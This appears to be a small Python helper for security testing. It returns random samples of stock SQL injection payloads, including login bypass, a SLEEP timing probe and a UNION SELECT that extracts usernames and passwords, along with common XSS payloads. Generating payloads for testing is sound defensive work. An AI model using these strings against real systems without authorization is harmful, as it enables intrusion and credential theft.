from typing import List  
import random

class PayloadGenerator:
    def generate_sqli_payloads(self, count: int = 5) -> List[str]:
        """Generate test SQLi payloads"""
        base_payloads = [
            "' OR 1=1 --",
            "admin' --",
            "\" OR \"\" = \"",
            "1 AND SLEEP(5)",
            "UNION SELECT NULL,username,password FROM users--"
        ]
        return random.sample(base_payloads, min(count, len(base_payloads)))

    def generate_xss_payloads(self, count: int = 5) -> List[str]:
        """Generate test XSS payloads"""
        base_payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "'><img src=x onerror=alert(1)>",
            "${alert(1)}"
        ]
        return random.sample(base_payloads, min(count, len(base_payloads)))